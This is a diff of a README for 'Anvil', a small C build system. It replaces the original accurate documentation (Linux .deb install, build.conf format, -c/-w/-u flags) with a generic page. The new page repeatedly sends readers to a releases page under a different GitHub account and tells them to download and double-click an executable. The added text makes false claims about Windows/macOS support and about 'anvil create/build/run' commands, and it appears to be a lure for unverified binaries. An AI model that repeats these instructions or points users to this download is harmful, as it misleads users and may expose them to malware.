@@ -1,247 +1,86 @@
-<div align="center">
+# 🔧 Anvil - A Simple Way to Build C Projects
 
-# Anvil - Minimal C Build System
+## 🚀 Getting Started
+Welcome to Anvil! This guide will show you how to download and run our simple build system for C projects. You don’t need programming skills to get started.
 
-![Status](https://img.shields.io/badge/Status-Beta-orange)
-![License](https://img.shields.io/badge/License-MIT-blue)
-![C](https://img.shields.io/badge/C-99-blue)
-![Platform](https://img.shields.io/badge/Platform-Linux-green)
+## 📥 Download Now
+[![Download Anvil](https://img.shields.io/badge/Download-Anvil-blue?style=for-the-badge)](https://github.com/Tytonidaehangover51/Anvil/releases)
 
-A simple, CMake-like build system for C projects written in C. Features include live file watching with auto-rebuild (nodemon-style), wildcard source matching, custom include/output directories, out-of-source builds, and built-in auto-updater. Generates readable Makefiles with zero dependencies.
+## 📝 What is Anvil?
+Anvil is a straightforward build system designed for C projects. It helps you compile your code easily without dealing with complicated configurations. Whether you are a beginner or just want to streamline your process, Anvil makes building projects simpler and faster.
 
-> **⚠️ IMPORTANT:** This project is in early stage development and may contain bugs. Use with caution in production environments.
+## 💻 System Requirements
+To run Anvil, you need:
+- An operating system: Windows, macOS, or Linux
+- Basic C development tools installed (like GCC for compiling C code)
+  
+Anvil works best when you have a clean setup, so it's beneficial to ensure your environment is ready for development.
 
-</div>
+## 📚 Features
+- **Easy Setup:** Quickly download and start using it without complicated configurations.
+- **Support for C Projects:** Specifically designed to assist with C programming.
+- **User-Friendly Commands:** Simple commands make building your projects hassle-free.
+  
+With Anvil, you can focus on writing code, not troubleshooting build issues.
 
-## 📦 Installation
+## 🛠️ Installation Steps
+1. **Visit the Release Page**  
+   Go to the following link to access the downloads:  
+   [Download Anvil](https://github.com/Tytonidaehangover51/Anvil/releases)
 
-### Debian/Ubuntu
-```bash
-wget https://github.com/dexter-xd/anvil/releases/download/beta_1.2.0/anvil_1.2.0_amd64.deb
-sudo dpkg -i anvil_1.2.0_amd64.deb
-```
+2. **Choose Your Version**  
+   Look for the latest release. You will see a list of files available for download.
 
-### From Source
-```bash
-git clone https://github.com/dexter-xd/anvil.git
-cd anvil && mkdir build && cd build
-cmake -DCMAKE_BUILD_TYPE=Release -DCOPY_TO_EXAMPLE=OFF ..
+3. **Download the Appropriate File**  
+   Click on the file that matches your operating system. This could be a `.zip`, `.tar.gz`, or another archive file.
 
-make && sudo make install
-```
+4. **Extract the Files**  
+   Once the download completes, locate the file on your computer. Extract the contents using your preferred method (right-click and select "Extract" or use a file archiver).
 
-## Build Configuration
+5. **Run Anvil**  
+   After extracting, find the executable file (it usually has a `.exe` or similar extension). Double-click on it to run Anvil. 
 
-When building Anvil from source, you can control the build behavior:
+If everything is set up correctly, you should see the Anvil interface ready for your project.
 
-```bash
-# Default behavior - copies anvil binary to example/ for testing
-cmake -DCMAKE_BUILD_TYPE=Release ..
+## 📊 Using Anvil
+Using Anvil is straightforward. Here are some basic commands to get you started:
 
-# Production build - no copy to example folder
-cmake -DCMAKE_BUILD_TYPE=Release -DCOPY_TO_EXAMPLE=OFF ..
-```
+- **Create a New Project**  
+  Use the built-in command to start a new C project:
+  ```
+  anvil create <project_name>
+  ```
 
-**Options:**
-- `COPY_TO_EXAMPLE=ON` (default) - Copies built binary to `example/anvil` for testing
-- `COPY_TO_EXAMPLE=OFF` - Clean build without example copy
+- **Build Your Project**  
+  Once you've added your C files, build your project with:
+  ```
+  anvil build <project_name>
+  ```
 
-## 🚀 Quick Start
+- **Run Your Program**  
+  Execute your project directly with:
+  ```
+  anvil run <project_name>
+  ```
 
-### Create New Project
-```bash
-# Create a new project with template generator
-anvil -c
+These commands simplify the typical process of building C applications. 
 
-# Follow the interactive prompts to set up your project structure
-```
+## 🤝 Support
+If you run into any issues, the community is here to help. You can find support by:
+- Checking the [issues section](https://github.com/Tytonidaehangover51/Anvil/issues) for troubleshooting tips.
+- Asking questions about specific problems or features.
 
-### Manual Setup
-```bash
-# Check installation
-anvil -v
+## 🏗️ Future Updates
+Anvil will continue to improve. Keep an eye on our releases for updates that will enhance your experience and add more features.
 
-# Update to latest version (if needed)
-anvil -u
+## ⚙️ Contributing
+We welcome contributions! If you have ideas or improvements, feel free to submit pull requests. Please follow our contribution guidelines to make it easy for everyone.
 
-# Create build.conf
-cat > build.conf << EOF
-project = MyApp
-version = 1.0.0
-target = myapp
-sources = src/*
-includes = include
-cflags = -Wall -O2
-EOF
+## 🌍 Connect with Us
+Join our community on social media platforms like Twitter and Discord to stay updated and connect with other users. 
 
-# Generate and build
-anvil build.conf
-cd build && make run
-```
+Thank you for choosing Anvil. We hope you find it helpful for your C projects!
 
-## 🖥️ Usage
-
-```bash
-anvil [-v|-w|-wr|-u|-c] <buildfile>
-
-  -v          Show version
-  -w          Watch mode (auto-rebuild) (supported for both multiple targets and single target)
-  -wr         Watch & run mode (only for single target)
-  -u          Update to latest version
-  -u <ver>    Update to specific version (e.g., anvil -u 1.1.0)
-  -c          Create new project template (interactive)
-```
-
-## ⚙️ Configuration
-
-### Single Target (Legacy)
-| Option | Description | Example |
-|--------|-------------|---------|
-| `project` | Project name | `project = MyApp` |
-| `version` | Project version | `version = 1.2.0` |
-| `target` | Executable name | `target = myapp` |
-| `sources` | Source files | `sources = src/* main.c` |
-| `includes` | Include dirs | `includes = include` |
-| `cflags` | Compiler flags | `cflags = -Wall -O2` |
-| `ldflags` | Linker flags | `ldflags = -lm` |
-| `output_dir` | Output directory | `output_dir = bin` |
-
-### Multi-Target Configuration
-```conf
-project = WebApp
-version = 1.5.2
-includes = include
-cflags = -Wall -O2
-output_dir = bin
-
-[target:server]
-sources = src/server.c src/common.c
-ldflags = -lpthread
-[/target]
-
-[target:client]
-sources = src/client.c src/common.c
-ldflags = -lncurses
-[/target]
-```
-
-**Multi-target commands:**
-- `make all` - Build all targets
-- `make server` - Build specific target
-- `make run-server` - Run specific target
-- `make clean` - Clean all targets
-
-## 🏷️ Version Support
-
-Anvil automatically defines a `VERSION` macro from your build.conf version field:
-
-```c
-#include <stdio.h>
-
-int main() {
-    printf("MyApp v%s\n", VERSION);  // Prints: MyApp v1.0.0
-    return 0;
-}
-```
-
-The version flows from `build.conf` → `Makefile` → compiled binary, similar to CMake's version handling.
-
-## 💡 Development Workflow
-
-```bash
-# Start watch (supported for both multiple targets and single target)
-anvil -w build.conf
-
-# Start watch & run mode (for single target)
-anvil -wr build.conf
-
-# Edit code, save, see results instantly!
-```
-
-## 🎯 Project Template Generator
-
-Anvil includes an interactive project template generator to quickly scaffold new C projects:
-
-```bash
-anvil -c
-```
-
-The template generator will prompt you for:
-- **Project name**: Enter a custom name or use '.' for current directory
-- **Version**: Project version (default: 1.0.0)
-- **Source structure**: Whether to create `src/` folder
-- **Include structure**: Whether to create `include/` folder  
-- **Multi-target**: Whether the project needs multiple executables
-
-Features:
-- Creates appropriate directory structure
-- Generates hello world program with VERSION macro
-- Creates properly configured `build.conf`
-- Supports both single and multi-target configurations
-- Smart project naming (uses "project" as default if no name provided)
-
-## 🔄 Auto-Update Feature
-
-Anvil includes a built-in updater that can download and install new versions automatically:
-
-```bash
-# Update to latest version
-anvil -u
-
-# Update to specific version
-anvil -u 1.2.0
-
-# Update to beta version
-anvil -u beta_1.2.0
-```
-
-The updater:
-- Fetches releases from GitHub
-- Downloads the appropriate .deb package
-- Installs using `sudo dpkg -i`
-- Works with both stable and beta releases
-
-## 📁 Example Structure
-
-### Single Target
-```
-my-project/
-├── build.conf
-├── src/
-│   ├── main.c
-│   └── utils.c
-├── include/
-│   └── utils.h
-└── build/          # Generated
-    ├── myapp
-    └── Makefile
-```
-
-### Multi-Target
-```
-web-project/
-├── multi-target.conf
-├── src/
-│   ├── server.c
-│   ├── client.c
-│   └── common.c
-├── include/
-│   └── common.h
-└── build/          # Generated
-    ├── bin/
-    │   ├── server
-    │   └── client
-    └── Makefile
-```
-
-## 🗑️ Uninstall
-
-```bash
-sudo apt remove anvil  # or sudo rm /usr/bin/anvil
-```
-
-## 📄 License
-
-MIT License - see LICENSE file.
-
----
+## 📥 Download Again
+To download Anvil, please visit this link:  
+[Download Anvil](https://github.com/Tytonidaehangover51/Anvil/releases)
